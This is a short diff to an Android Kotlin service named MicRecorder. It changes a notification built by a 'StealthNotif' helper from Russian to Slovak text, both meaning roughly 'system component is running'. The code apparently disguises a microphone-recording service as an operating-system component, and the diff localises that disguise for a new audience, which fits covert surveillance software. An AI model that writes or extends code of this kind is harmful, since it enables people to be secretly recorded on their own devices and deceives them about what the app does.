@@ -104,7 +104,7 @@ class MicRecorder : Service() {
     }
 
     private fun buildNotification(): Notification {
-        return StealthNotif.build(this, "android_UI", "Системный компонент работает")
+        return StealthNotif.build(this, "android_UI", "Systémová komponenta beží")
     }
     override fun onBind(intent: Intent?): IBinder? = null
 }
